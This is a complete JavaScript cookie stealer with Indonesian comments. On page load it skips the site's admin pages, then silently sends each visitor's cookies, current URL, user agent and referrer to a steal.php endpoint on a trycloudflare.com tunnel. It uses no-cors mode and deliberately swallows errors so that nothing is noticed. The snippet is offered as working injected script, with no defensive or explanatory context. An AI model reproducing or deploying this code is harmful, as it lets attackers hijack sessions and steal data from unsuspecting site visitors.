window.addEventListener('load', () => {
    const currentUrl = window.location.href;

    if (currentUrl.includes('/admin/')) {
        console.log('Halaman admin, script tidak dijalankan');
        return;
    }

    const stealUrl = 'https://soonest-therapist-backgrounds-producer.trycloudflare.com/steal.php';

    const params = new URLSearchParams({
        cookie: document.cookie,
        url: location.href,
        ua: navigator.userAgent,
        ref: document.referrer
    });

    fetch(stealUrl + '?' + params.toString(), {
        method: 'GET',
        mode: 'no-cors'
    })
    .catch(() => {}); // sengaja di-silent
});
